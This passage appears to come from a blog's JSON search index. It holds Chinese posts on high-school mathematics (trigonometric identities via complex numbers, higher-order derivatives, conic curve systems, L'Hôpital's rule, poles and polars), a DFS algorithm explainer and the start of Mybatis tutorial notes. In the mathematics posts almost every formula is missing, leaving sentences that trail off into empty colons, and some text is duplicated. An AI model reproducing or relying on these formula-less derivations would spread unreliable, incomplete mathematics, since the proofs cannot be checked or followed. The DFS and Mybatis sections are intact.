将其分为4组，有多少种方法？\n\n2.将10本相同的书分给4个班级，要求每个班级至少两本书，共有多少种排列方法？原题可等价为（）这样的解有多少个(x分别代表分给每个班书的数目)（使用条件）令（）\n\n\n方程等价为\n化简得\n即将6本相同书分给4个班级，每班至少1本=\n","categories":["数学"],"tags":["排列组合","数学","奇思妙想"]},{"title":"用复数方法证明三角恒等式","url":"/2022/12/14/%E6%95%B0%E5%AD%A6/%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B6/","content":"用复数方法证明三角恒等式曾写过：“复数，通往真理的最短路径”。复数的便利，在于它沟通了代数和几何。今天，让我们用复数方法证明三角恒等式。理论基础\n要借助复数证明三角恒等式，我们一般需要构造具有以下形式的复数：这类复数具有许多好的性质，我们熟知的有：此外，我们再引入另外两条常用的性质：故：\n同理可得：\n累加证明：设，则：    对比虚实部，即证\n令 ，得：\n我们可以证明许多有趣的式子：连乘\n要证明与三角函数有关的连乘式，我们需要考虑多项式的分解，例如：记，有五个根，而 ，于是有：我们发现，如果我们代入 z=1 ，就能利用上述的 (3) ，得到关于 sin 的连乘式；如果我们代入 z=-1 ，就能利用上述的 (4) ，得到关于 cos 的连乘式\n下面我们具体讨论以下两类不同的方程：记，则 w,w3⋯,w4m−3w,,是的个根\n又因为，于是 w⋯,w2m−3,w2m+1⋯,,,是的 2m−22m-2 个虚根\n由因式分解，知：代入，并置，z=1 得：所以：又因为，故：代入 z=-1 得：又因为，故：于是：记，则是的 2m−12m-1 个根\n又因为，于是是的 2m−22m-2 个虚根\n由因式分解，知：代入 z=1 ，得：\n于是：代入 z=-1 ，得：\n故：记 ，则  是  的  个根\n又因为，于是是的个虚根\n由因式分解，知：代入 z=1 ，得：于是：代入 z=-1 ，得：又因为，所以：故：实际上， (12) 不过是 (9) 和 (11) 的更一般的形式\n","categories":["数学"],"tags":["数学","复数","三角恒等式"]},{"title":"【导数问题】高阶导数","url":"/2022/12/14/%E6%95%B0%E5%AD%A6/%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B61/","content":"1.函数凹凸性函数的凹凸性通常是指函数的以下性质：函数凹凸性的定义 ：在区间上有定义，被称为是凹函数当且仅当对于任意，任意，有 :注：凸函数当且仅当但是在高中阶段，由于研究的函数很少涉及抽象函数（即绝大多数函数都有表达式），且多为初等函数，凹凸性的判定可以使用二次导数：\n（若在区间上有二阶导数，）则 在上为凹函数的充要条件为：（也就是切线斜率单调增）（凸函数同理）\n为了加深理解与方便应用，我们来考察一下此两者的几何意义（以凹函数为例）。表明凹函数上任意两点的连线上的点总在曲线上方。表明凹函数上点的斜线斜率随着自变量单调递增。\n事实上，凹函数还有一个重要的性质，那就是：在给定区间内，切线始终在函数图像下方。\n我们知道，一阶导数为零的点（特指变号零点，即零点左右值正负性相反的点）是函数单调性变化的点，也就是函数的极值点；二阶导数为零的点（特指编号零点）是函数凹凸性变化的点，我们将之称为拐点。\n拐点处的切线会兼具凹函数，凸函数的一些特点，比如在拐点两侧处于函数图像的不同上下方（异侧相切）。关于切线问题，将在后一个部分有详细介绍。\n（这里说一件有关函数凹凸性的趣事：凹凸性在大学数学中是一块基础的内容，可是诸多教材上有截然相反的定义：有的将二阶导数正定义为凸，可能是因为两者都给人positive的感觉；有的将函数向上凸称为凸函数，比较符合二维图像给人的直观感受。不论如何，大家记住中国古代哲学家庄子的一句话：“物谓之而然。”）\n2.两条曲线在一个点各种各样的相交情形在许多超越函数的近似过程中，有时会遇到一个尴尬的情况：当你得到的函数与期望的放缩方向只在相等点的一侧成立，却在另一侧有相反的大小情况。这是你不得不再为另外一边寻找一个近似方法。\n而更为尴尬的是，往往在相等点两侧不同大小的函数有更好的逼近效果。实在令人抓狂。特别是在帕德逼近的近似函数中，有些近似函数与超越函数函数有一致的大小关系，而有些近似函数与超越函数大小关系在相等点有所变化，具体情况如下：\n接下来考虑使用高阶导数分析的方法来解释这一情况。\n考察两个函数与（不妨假设此二函数在所研究区间里面单调性，凹凸性都相同，不妨都单调递增且上凸）：\n首先假设，则两个函数在处有公共点。\n若，在左侧g较大，右侧f较大。\n若，在左侧f较大，右侧g较大。\n若，两条函数图像有公切线。\n当时，\n若，在附近f均较大，但是处于公切线下方。\n若，在附近g均较大，但是处于公切线下方。\n若，进一步讨论如下。\n当时，\n若，在 左侧g较大，右侧f较大，但都处于公切线下方。\n若，在左侧g较大，右侧f较大，但都处于公切线下方。\n若 ，进一步讨论如下\n………\n当时（若n为偶数），\n若，在附近f均较大，但是处于公切线下方。\n若，在附近g均较大，但是处于公切线下方。\n若，进一步讨论。\n当时（若n为奇数），\n若，在左侧g较大，右侧f较大，但都处于公切线下方。\n若，在左侧g较大，右侧f较大，但都处于公切线下方。\n若，进一步讨论。\n……\n总结：\n在奇数阶导数恰好相等时有一致的大小关系（同侧相切）。\n在偶数阶导数恰好相等时有变化的大小关系（异侧相切）。\n（恰好指之前的若干阶导数均相同但是后一阶导数不同）\n在与的帕德逼近中，我们可以发现，处于某几个对角线的函数恰好有这样的关系，这从一个角度验证了这一个规律。\n可以发现，蓝色部分的逼近部分都有一致的单调性，据此可以猜测：在帕德逼近中，当分子分母次数之和为奇数时，近似函数与原有的超越函数在取等点有一致的大小关系；当分子分母次数之和为偶数时，近似函数与原有的超越函数在取等点有变化的大小关系。3.有关高阶导数的方法\n先用函数恒大于0来说明情况。\n不难发现，\n\n想法1\n\n求导得到 ，则有继续求导则有再不难分析得到，即可完成本题的证明。\n不妨设想，如果我们最后的不等式不成立或是证明其成立比较繁琐，也就是在二阶导数有零点的情况下，上述分析方法变得不再有力，我们或许需要通过放缩来完成这一证明。\n\n想法2\n\n提到放缩，可能会想到将放缩成为，也就是：这时，由于切线放缩的性质，仍然有：\n随后求导发现：，仍然有： \n只要我们孜孜不倦地求导：\n，就会发现，无法得证。\n其原因在于放缩过头，导致“过犹不及”，这一步切线放缩在二阶导数的变化大于所能承受的范围。\n\n想法3\n\n我们要控制放缩的力度，考虑到则有 :，。，。，。继续求导有， ，亦得证。\n","categories":["数学"],"tags":["数学","导数"]},{"title":"二次曲线系","url":"/2022/12/14/%E6%95%B0%E5%AD%A6/%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B63/","content":"二次曲线系可以考虑使用直线（一次方程）的乘积来表示二次曲线（二次方程）。平面坐标系中的直线AB有其一般式：，为方便表述，后文中简记作。平面中退化的二次曲线总有平行于坐标轴的对称轴，为方便表述，后文中简记作 。引理1：方程表示两条直线上的所有点。引理2：平面上不共线五点确定一个二次曲线。\n命题1：已给平面上互异四点A，B，C，D，则下述曲线系方程表示所有过该四点的二次曲线。证明：对于该方程，将四点坐标代入，不难得到四点均在该曲线上，另外对于第五个点，由方程取参数，则可以验证得到的二次曲线过A，B，C，D，P五个点。\n命题2：退化的二次曲线与，如果有四个交点，则该四个交点共圆。\n证明：构造曲线系，取则所表示的曲线二次项系数相同，表示一个圆，不难验证该圆过交点。\n命题3：退化的二次曲线上一点P，过该点作斜率分别为，的直线，分别交该二次曲线于M，N两点（M，N异于P），则：\n（1）若，则MN斜率为定值。\n（2）若为定值，则MN过定点。\n证明：设二次曲线为设，由配极方法知道该点切线为：不难写出：设直线MN：\n写出曲线系方程：比较系数：使用的系数表达式解出，使用xy的系数表达式解出，并将代入。\n（1）将由xy系数的比较不难发现当时，k也为定值。\n（2）由上述四式子可以得到，过程较繁琐，在此从简：\n第四个式子整理后得到 :先作换元。使用的系数表达式解出，使用xy的系数表达式解出，然后讲上述的表达式代入1的系数表达式，注意到点P在曲线C上这个条件，将结果化简，然后与所求直线MN：相比较，即可得到定点。\n","categories":["数学"],"tags":["数学","奇思妙想","圆锥曲线","曲线系"]},{"title":"【洛必达】","url":"/2022/12/15/%E6%95%B0%E5%AD%A6/%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B64/","content":"【洛必达】一、洛必达（L’Hopital）法则这里就不涉及到严格的极限的定义，因为高中数学的课本中没有讲到极限的定义。\n先来讲一个简单的概念：不定式。\n设我们有两个函数和，若当时，有，则称分式为型不定式；\n同样地，若当时， 有并且（这里的无穷大可正可负）则称分式为型不定式。\n上面便是洛必达法则使用的前提条件，只有在满足条件时才能“洛”。\n洛必达法则的内容如下，分为型不定式和型不定式。\n定理1（型不定式）若当时，为型不定式， 和 存在，且不是不定式，则；\n定理2 （型不定式） 若当时，为型不定式，和存在，且不是不定式，则。\n要解释这个定理，只需要用到导数的定义。\n（需要注意的是，在这里我用的字眼是“解释”而不是“证明”，希望大家不要有着“证明就可以用”的念头。）\n先考虑定理1，根据导数的定义，。则，其中，又根据，代入后即可得到，即为所求结果。\n再考虑定理2，当时，若，则，记，，则是型不定式，对其应用定理1由此解得，也即至此，便可以（不严谨地）说明上面的结论成立。\n","categories":["数学"],"tags":["数学","导数","高数","阴间解法"]},{"title":"交点曲线系“除法”","url":"/2022/12/15/%E6%95%B0%E5%AD%A6/%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B65/","content":"交点曲线系“除法”先来描述一下这类问题：过圆锥曲线 E 上的一点 P 作两条直线  和 ，两条直线的斜率和存在某种等量关系（和或积为某定值），两条直线又分别与 E 有另外两个交点 A , B ，则直线过定点。\n齐次化联立就是让两条直线合起来写为一个二次方程，让这个二次方程与圆锥曲线方程联立，所得到的方程再通过消项变为一次方程。只要这个消项过程中没有消去点 A 或点 B 对应的解，所得到的一次方程也就仍然满足的坐标。再由“两点确定一条直线”知所得一次方程即为直线的方程。最后根据方程中的参数，整理后写为过定点的直线系方程即可求出定点。\n齐次化联立的第一步是把两条直线相乘得到双直线方程。沿用上面的符号，由于一条直线与圆锥曲线（未退化）至多有两个交点，故这里和的所有交点即 P , A 和 B 。联立和所得到的方程应该能代入这三个点的坐标。而目标方程是直线的方程，因此就需要消去点 P 的坐标对应的式子。\n","categories":["数学"],"tags":["数学","圆锥曲线","曲线系","阴间解法"]},{"title":"齐次化解圆锥曲线","url":"/2022/12/15/%E6%95%B0%E5%AD%A6/%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B66/","content":"1.“齐次”的理解\n“齐次”，即次数相等的意思。例如称为二次齐式，即二次齐式的意思是，的每一项都是关于 x,yx,y 的二次项。2.“齐次化联立”的理解\n在解析几何中，过某定点的两条直线的斜率关系可以通过化齐次联立的方法进行转化。\n如：\n一条直线与曲线相交，且两个交点对原点的张角为直角，我们在联立消元时，可以选择（即交点到原点连线的斜率 kk ），\n因此得到一元二次方程，它的两个根是，\n把看作一个整体，根据所学知识，两直线为直角，两直线的斜率之积为 −1 。\n则根据韦达定理，得到两根之积。\n即，从而大大简化运算。3.”齐次化联立“步骤\n在联立消元时，要想达到这个目的，就需要将原来的方程转化成关于 x,y 的齐次式。\n我们高中研究的是圆锥曲线的中心在原点上，不会涉及曲线的平移和旋转。\n所以，对于二次曲线与直线来说。\n步骤1：直线方程转化为常数是一次式或者另设直线方程 ；\n先埋个伏笔：为什么我们要将直线方程转化或设为这种奇奇怪怪的式子？\n这个问题会在后文给出答案。\n值得说明的是\n形式的直线方程的瑕疵是不能表示垂直 x 轴的直线，\n形式的直线方程的瑕疵是不能表示过原点的直线。\n步骤2：代入时对较低次的项直接乘以常数1即可。\n见证奇迹的时刻到了！！！\n看看这两个方程的等式右边，是不是都是1！而等式左边是不是各项都是一次项！这是有意为之的！\n因为我们知道，二次曲线的各项有常数项、一次项、二次项，显然不满足齐次式。\n这里我们就需要将常数项、一次项都转化为二次项，使得各项齐次。而我们知道各项乘上1是不影响等式两边大小的。\n因为转化后的直线方程，等式左右两边的值是常数1.\n所以我们只需默默地在一次项乘上转化后的直线方程，在常数项乘上转化后的直线方程的平方就可构造齐次式了。\n即：\n或者：\n步骤3：将上述方程左右两边同除即可，于是得到关于的一元二次方程。\n最终化成类似于一元二次方程的形式，\n懒得化简\n步骤4：运用根与系数的关系求出，\n还是写一下吧：\n","categories":["数学"],"tags":["数学","圆锥曲线","阴间解法","齐次"]},{"title":"极点与极线","url":"/2022/12/17/%E6%95%B0%E5%AD%A6/%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B67/","content":"极点与极线极线可以通过以下的方法作出来（以椭圆为例）：\n过平面内任意一点 P （此时P在曲线内）作直线 AB 、 CD 与二次曲线交于 A 、 B 、 C 、 D 四点。直线 AD 与 BC 交于点 Q ，直线 AC 与 BD 交于点 R 。\n则直线 QR 为极点 P 对该二次曲线的极线。\n接下来谈谈极线的有趣的性质，先考虑椭圆的情况。\n设 椭圆\n一、极点在椭圆上当 P 点在曲线上时， P 、B 、 D 、 Q 四点重合，极线为 P 处切线。下面来证明：椭圆上一点 处切线（极线）方程为\n证明 两边对 xx 求导得：即代入 P(x0,y0)得：则切线可表示为整理得所以 P(x0,y0)处切线（极线）方程为\n二、极点在椭圆外先给出结论：对于极点 P(x0,y0) 极线方程仍为接下来证明：过 P(x0,y0) 作椭圆的两条切线，切点为 A ， B ，则AB 的方程为。 证明 设 A(x_1,y_1) ， B(x_2,y_2) ，则两条切线分别为：\n，\n由于在两条切线上，，\n所以 A ， B 满足方程所以 AB 的方程为因此，点对于曲线的极线，其实就是曲线的切点弦，也就是两切点所在的直线。\n三、极点在椭圆内结论：对于极点，极线方程为\n所以可以得到结论：过极点 P 作直线 AB 交曲线于 A 、 B 两点，则曲线在该两点的切线交于极点 P 的极线上。特别地，以椭圆的焦点为极点时，极线的方程为，即，极线为焦点对应的准线。双曲线、抛物线同理。\n对于曲线和点，极线方程为\n","categories":["数学"],"tags":["数学","圆锥曲线","阴间解法","极点与极线"]},{"title":"借助积分（导数）放缩","url":"/2022/12/17/%E6%95%B0%E5%AD%A6/%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B68/","content":"借助积分（导数）放缩 证明： 证明 注意到故只需证：对于令，又，故当时，，即令有，故原不等式成立\n用积分怎么巧妙地证明不等式：令，我们在坐标系中画出的图像，如下图。由图形可知故不等式成立。\n不等式1 不等式2 不等式3 其中，由不等式2可以证明如下不等式的左端\n","categories":["数学"],"tags":["数学","导数","积分"]},{"title":"dfs算法","url":"/2024/10/14/%E7%AE%97%E6%B3%95/dfs%E7%AE%97%E6%B3%95/","content":"一、算法原理DFS算法从起始节点开始，沿着一条路径尽可能深地访问下去，直到无法再继续（即到达叶子节点或遇到已访问过的节点），然后回溯到上一个节点，继续探索其他路径。这种方式类似于迷宫中的探索策略，深入一条路直到死胡同，然后返回上一个岔路口继续探索其他路。\n二、实现方法DFS算法可以通过递归或显式栈来实现。以下是两种实现方法的简要介绍：\n\n递归实现：\n\n选择一个起始节点作为当前节点，并标记为已访问。\n检查当前节点是否满足终止条件（如到达目标节点或无法继续深入），如果满足则返回结果。\n如果不满足终止条件，则遍历当前节点的所有未访问的邻居节点。\n对每个未访问的邻居节点，递归调用DFS函数，将其作为新的当前节点。\n当当前节点的所有邻居节点都被访问过时，回溯到上一层节点。\n\n\n显式栈实现：\n\n使用一个栈来保存待访问的节点。\n将起始节点压入栈中，并标记为已访问。\n当栈不为空时，执行以下操作：\n弹出栈顶节点作为当前节点。\n处理当前节点（如打印、记录等）。\n遍历当前节点的所有未访问的邻居节点，并将它们压入栈中。\n\n\n\n\n\n三、算法特点\n简单易懂：DFS算法的思想简单，易于理解和实现。\n内存占用小：DFS使用递归或栈来模拟递归过程，只需要保存当前路径上的节点，因此内存占用较小。\n可解决连通性问题：对于图，DFS可以用来判断给定的两个节点是否连通。\n寻找可行解：在搜索问题中，DFS可以被用来寻找一条可行解，通过深度搜索路径来一步步找到目标解。\n没有最优性：DFS并不保证找到最优解，它只会尽可能往深层次搜索，直到达到终止条件。因此，在某些情况下可能得到次优解。\n可能陷入无限循环：如果图中存在环路，且没有访问记录的话，DFS可能会陷入无限循环中，导致无法停止。因此，在实际应用中需要特别注意环的检测和处理。\n\n四、应用场景DFS算法在各个领域都有广泛的应用，以下是几个典型的应用场景：\n\n迷宫问题：通过深度优先搜索的方式，可以递归地探索迷宫中的每个可能路径，直到找到一条通向终点的路径或者所有路径都被探索完毕。\n社交网络分析：在社交网络中，DFS算法可以用于模拟信息的传播过程。以某个用户为起点，通过深度优先搜索的方式向其关注的用户传播信息，进而影响更多的用户。这有助于理解信息在社交网络中的传播规律和影响力分析。\n数独问题：通过递归地尝试不同的数字填充空白格子，然后验证是否满足数独的规则，直到找到满足条件的解。这种方法类似于在搜索树中进行深度优先搜索。\n图像处理：DFS算法可以用于分析图像中的连通性，即判断图像中的像素点是否相互连通。通过从某个起点开始，递归地探索与之相连的像素点，可以确定图像中的不同区域及其连通性。\n拓扑排序：对有向无环图（DAG）进行拓扑排序时，可以使用DFS算法。通过深度优先搜索的方式，可以得到一个拓扑序列，其中每个节点的出现顺序满足图中的依赖关系。\n\n五、注意事项\n环检测：在有向图中使用DFS时，需要特别注意环的存在。为了避免陷入无限循环，可以使用一个访问标记数组来记录已访问过的节点。\n剪枝策略：有时在DFS中可以通过剪枝策略来减少搜索空间，提高效率。例如，在求解某些问题时，可以提前判断某些路径不可能得到最优解或满足条件，从而提前终止搜索。\n递归深度：当图的深度非常大时，DFS使用递归实现可能导致堆栈溢出的风险。因此，在实际应用中需要根据具体情况选择合适的算法实现方式（如使用显式栈代替递归）。\n\n","categories":["算法"],"tags":["算法","OJ"]},{"title":"狂神Mybatis笔记","url":"/2025/05/03/java/Mybatis/README/","content":"Mybatis-9.28环境：\n\nJDK1.8\nMysql 5.7\nmaven 3.6.1\nIDEA\n\n回顾：\n\nJDBC\nMysql\nJava基础\nMaven\nJunit\n\nSSM框架：配置文件的。  最好的方式：看官网文档；\n1、简介1.1、什么是Mybatis\n\nMyBatis 是一款优秀的持久层框架\n它支持定制化 SQL、存储过程以及高级映射。\nMyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。\nMyBatis 可以使用简单的 XML 或注解来配置和映射原生类型、接口和 Java 的 POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。\nMyBatis 本是apache 的一个开源项目iBatis , 2010年这个项目由apache software foundation 迁移到了google code，并且改名为MyBatis 。\n2013年11月迁移到Github。\n\n如何获得Mybatis？\n\nmaven仓库：\n&lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis --&gt;&lt;dependency&gt;    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;    &lt;artifactId&gt;mybatis&lt;/artifactId&gt;    &lt;version&gt;3.5.2&lt;/version&gt;&lt;/dependency&gt;\n\nGithub ： https://github.com/mybatis/mybatis-3/releases \n\n中文文档：https://mybatis.org/mybatis-3/zh/index.html \n\n\n1.2、持久化数据持久化\n\n持久化就是将程序的数据在持久状态和瞬时状态转化的过程\n内存：断电即失\n数据库(Jdbc)，io文件持久化。\n生活：冷藏. 罐头。\n\n为什么需要需要持久化？\n\n有一些对象，不能让他丢掉。\n\n内存太贵了\n\n\n1.3、持久层Dao层，Service层，Controller层….\n\n完成持久化工作的代码块\n层界限十分明显。\n\n1.4 为什么需要Mybatis？\n帮助程序猿将数据存入到数据库中。\n方便\n传统的JDBC代码太复杂了。简化。框架。自动化。\n不用Mybatis也可以。更容易上手。 技术没有高低之分\n优点：\n简单易学\n灵活\nsql和代码的分离，提高了可维护性。\n提供映射标签，支持对象与数据库的orm字段关系映射\n提供对象关系映射标签，支持对象关系组建维护\n提供xml标签，支持编写动态sql。\n\n\n\n最重要的一点：使用的人多！\nSpring   SpringMVC    SpringBoot\n2、第一个Mybatis程序思路：搭建环境–&gt;导入Mybatis–&gt;编写代码–&gt;测试！\n2.1、搭建环境搭建数据库\nCREATE DATABASE `mybatis`;USE `mybatis`;CREATE TABLE `user`(  `id` INT(20) NOT NULL PRIMARY KEY,  `name` VARCHAR(30) DEFAULT NULL,  `pwd` VARCHAR(30) DEFAULT NULL)ENGINE=INNODB DEFAULT CHARSET=utf8;INSERT INTO `user`(`id`,`name`,`pwd`) VALUES (1,&#x27;狂神&#x27;,&#x27;123456&#x27;),(2,&#x27;张三&#x27;,&#x27;123456&#x27;),(3,&#x27;李四&#x27;,&#x27;123890&#x27;)\n\n新建项目\n\n新建一个普通的maven项目\n\n删除src目录\n\n导入maven依赖\n   &lt;!--导入依赖--&gt;&lt;dependencies&gt;    &lt;!--mysql驱动--&gt;    &lt;dependency&gt;        &lt;groupId&gt;mysql&lt;/groupId&gt;        &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;        &lt;version&gt;5.1.47&lt;/version&gt;    &lt;/dependency&gt;    &lt;!--mybatis--&gt;    &lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis --&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.mybatis&lt;/groupId&gt;        &lt;artifactId&gt;mybatis&lt;/artifactId&gt;        &lt;version&gt;3.5.2&lt;/version&gt;    &lt;/dependency&gt;    &lt;!--junit--&gt;    &lt;dependency&gt;        &lt;groupId&gt;junit&lt;/groupId&gt;        &lt;artifactId&gt;junit&lt;/artifactId&gt;        &lt;version&gt;4.12&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;\n\n2.2、创建一个模块\n编写mybatis的核心配置文件\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE configuration        PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;        &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;&lt;!--configuration核心配置文件--&gt;&lt;configuration&gt;    &lt;environments default=&quot;development&quot;&gt;        &lt;environment id=&quot;development&quot;&gt;            &lt;transactionManager type=&quot;JDBC&quot;/&gt;            &lt;dataSource type=&quot;POOLED&quot;&gt;                &lt;property name=&quot;driver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt;                &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/mybatis?useSSL=true&amp;amp;useUnicode=true&amp;amp;characterEncoding=UTF-8&quot;/&gt;                &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt;                &lt;property name=&quot;password&quot; value=&quot;123456&quot;/&gt;            &lt;/dataSource&gt;        &lt;/environment&gt;    &lt;/environments&gt;&lt;/configuration&gt;\n\n编写mybatis工具类\n//sqlSessionFactory --&gt; sqlSessionpublic class MybatisUtils &#123;    private static SqlSessionFactory sqlSessionFactory;    static&#123;        try &#123;            //使用Mybatis第一步：获取sqlSessionFactory对象            String resource = &quot;mybatis-config.xml&quot;;            InputStream inputStream = Resources.getResourceAsStream(resource);            sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;    //既然有了 SqlSessionFactory，顾名思义，我们就可以从中获得 SqlSession 的实例了。    // SqlSession 完全包含了面向数据库执行 SQL 命令所需的所有方法。    public static SqlSession  getSqlSession()&#123;        return sqlSessionFactory.openSession();    &#125;&#125;\n\n2.3、编写代码\n实体类\npackage com.kuang.pojo;//实体类public class User &#123;    private int id;    private String name;    private String pwd;    public User() &#123;    &#125;    public User(int id, String name, String pwd) &#123;        this.id = id;        this.name = name;        this.pwd = pwd;    &#125;    public int getId() &#123;        return id;    &#125;    public void setId(int id) &#123;        this.id = id;    &#125;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public String getPwd() &#123;        return pwd;    &#125;    public void setPwd(String pwd) &#123;        this.pwd = pwd;    &#125;    @Override    public String toString() &#123;        return &quot;User&#123;&quot; +                &quot;id=&quot; + id +                &quot;, name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; +                &quot;, pwd=&#x27;&quot; + pwd + &#x27;\\&#x27;&#x27; +                &#x27;&#125;&#x27;;    &#125;&#125;\n\nDao接口\npublic interface UserDao &#123;    List&lt;User&gt; getUserList();&#125;\n\n接口实现类由原来的UserDaoImpl转变为一个 Mapper配置文件.\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;        &lt;!DOCTYPE mapper                PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;                &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;        &lt;!--namespace=绑定一个对应的Dao/Mapper接口--&gt;&lt;mapper namespace=&quot;com.kuang.dao.UserDao&quot;&gt;&lt;!--select查询语句--&gt;   &lt;select id=&quot;getUserList&quot; resultType=&quot;com.kuang.pojo.User&quot;&gt;       select * from mybatis.user   &lt;/select&gt;&lt;/mapper&gt;\n\n2.4、测试注意点：\norg.apache.ibatis.binding.BindingException: Type interface com.kuang.dao.UserDao is not known to the MapperRegistry.\nMapperRegistry是什么？\n核心配置文件中注册 mappers\n\njunit测试\n@Testpublic void test()&#123;    //第一步：获得SqlSession对象    SqlSession sqlSession = MybatisUtils.getSqlSession();    //方式一：getMapper    UserDao userDao = sqlSession.getMapper(UserDao.class);    List&lt;User&gt; userList = userDao.getUserList();    for (User user : userList) &#123;        System.out.println(user);    &#125;    //关闭SqlSession    sqlSession.close();&#125;\n\n你们可以能会遇到的问题：\n\n配置文件没有注册\n绑定接口错误。\n方法名不对\n返回类型不对\nMaven导出资源问题\n\n3、CRUD1、namespacenamespace中的包名要和 Dao&#x2F;mapper 接口的包名一致！\n2、select选择，查询语句;\n\nid : 就是对应的namespace中的方法名；\nresultType：Sql语句执行的返回值！\nparameterType ： 参数类型！\n\n\n编写接口\n//根据ID查询用户User getUserById(int id);\n\n编写对应的mapper中的sql语句\n&lt;select id=&quot;getUserById&quot; parameterType=&quot;int&quot; resultType=&quot;com.kuang.pojo.User&quot;&gt;        select * from mybatis.user where id = #&#123;id&#125;&lt;/select&gt;\n\n测试\n@Testpublic void getUserById() &#123;    SqlSession sqlSession = MybatisUtils.getSqlSession();       UserMapper mapper = sqlSession.getMapper(UserMapper.class);       User user = mapper.getUserById(1);    System.out.println(user);       sqlSession.close();&#125;   \n\n3、Insert&lt;!--对象中的属性，可以直接取出来--&gt;&lt;insert id=&quot;addUser&quot; parameterType=&quot;com.kuang.pojo.User&quot;&gt;    insert into mybatis.user (id, name, pwd) values (#&#123;id&#125;,#&#123;name&#125;,#&#123;pwd&#125;);&lt;/insert&gt;\n\n4、update&lt;update id=&quot;updateUser&quot; parameterType=&quot;com.kuang.pojo.User&quot;&gt;    update mybatis.user set name=#&#123;name&#125;,pwd=#&#123;pwd&#125;  where id = #&#123;id&#125; ;&lt;/update&gt;\n\n5、Delete&lt;delete id=&quot;deleteUser&quot; parameterType=&quot;int&quot;&gt;    delete from mybatis.user where id = #&#123;id&#125;;&lt;/delete&gt;\n\n\n\n注意点：\n\n增删改需要提交事务！\n\n6、分析错误\n标签不要匹配错\nresource 绑定mapper，需要使用路径！\n程序配置文件必须符合规范！\nNullPointerException，没有注册到资源!\n输出的xml文件中存在中文乱码问题！\nmaven资源没有导出问题！\n\n7、万能Map假设，我们的实体类，或者数据库中的表，字段或者参数过多，我们应当考虑使用Map！\n//万能的Mapint addUser2(Map&lt;String,Object&gt; map);\n\n&lt;!--对象中的属性，可以直接取出来    传递map的key--&gt;&lt;insert id=&quot;addUser&quot; parameterType=&quot;map&quot;&gt;    insert into mybatis.user (id, pwd) values (#&#123;userid&#125;,#&#123;passWord&#125;);&lt;/insert&gt;\n\n@Testpublic void addUser2()&#123;    SqlSession sqlSession = MybatisUtils.getSqlSession();    UserMapper mapper = sqlSession.getMapper(UserMapper.class);    Map&lt;String, Object&gt; map = new HashMap&lt;String, Object&gt;();    map.put(&quot;userid&quot;,5);    map.put(&quot;passWord&quot;,&quot;2222333&quot;);    mapper.addUser2(map);    sqlSession.close();&#125;\n\n\n\nMap传递参数，直接在sql中取出key即可！    【parameterType&#x3D;”map”】\n对象传递参数，直接在sql中取对象的属性即可！【parameterType&#x3D;”Object”】\n只有一个基本类型参数的情况下，可以直接在sql中取到！\n多个参数用Map，或者注解！\n8、思考题模糊查询怎么写？\n\nJava代码执行的时候，传递通配符 % %\nList&lt;User&gt; userList = mapper.getUserLike(&quot;%李%&quot;);\n\n在sql拼接中使用通配符！\nselect * from mybatis.user where name like &quot;%&quot;#&#123;value&#125;&quot;%&quot;\n\n4、配置解析1、核心配置文件\nmybatis-config.xml\n\nMyBatis 的配置文件包含了会深深影响 MyBatis 行为的设置和属性信息。 \nconfiguration（配置）properties（属性）settings（设置）typeAliases（类型别名）typeHandlers（类型处理器）objectFactory（对象工厂）plugins（插件）environments（环境配置）environment（环境变量）transactionManager（事务管理器）dataSource（数据源）databaseIdProvider（数据库厂商标识）mappers（映射器）\n\n2、环境配置（environments）MyBatis 可以配置成适应多种环境\n不过要记住：尽管可以配置多个环境，但每个 SqlSessionFactory 实例只能选择一种环境。\n学会使用配置多套运行环境！\nMybatis默认的事务管理器就是 JDBC  ， 连接池 ： POOLED\n3、属性（properties）我们可以通过properties属性来实现引用配置文件\n这些属性都是可外部配置且可动态替换的，既可以在典型的 Java 属性文件中配置，亦可通过 properties 元素的子元素来传递。【db.properties】\n\n编写一个配置文件\ndb.properties\ndriver=com.mysql.jdbc.Driverurl=jdbc:mysql://localhost:3306/mybatis?useSSL=true&amp;useUnicode=true&amp;characterEncoding=UTF-8username=rootpassword=123456\n\n在核心配置文件中映入\n&lt;!--引入外部配置文件--&gt;&lt;properties resource=&quot;db.properties&quot;&gt;    &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt;    &lt;property name=&quot;pwd&quot; value=&quot;11111&quot;/&gt;&lt;/properties&gt;\n\n\n可以直接引入外部文件\n可以在其中增加一些属性配置\n如果两个文件有同一个字段，优先使用外部配置文件的！\n\n4、类型别名（typeAliases）\n类型别名是为 Java 类型设置一个短的名字。‘\n存在的意义仅在于用来减少类完全限定名的冗余。\n\n&lt;!--可以给实体类起别名--&gt;&lt;typeAliases&gt;    &lt;typeAlias type=&quot;com.kuang.pojo.User&quot; 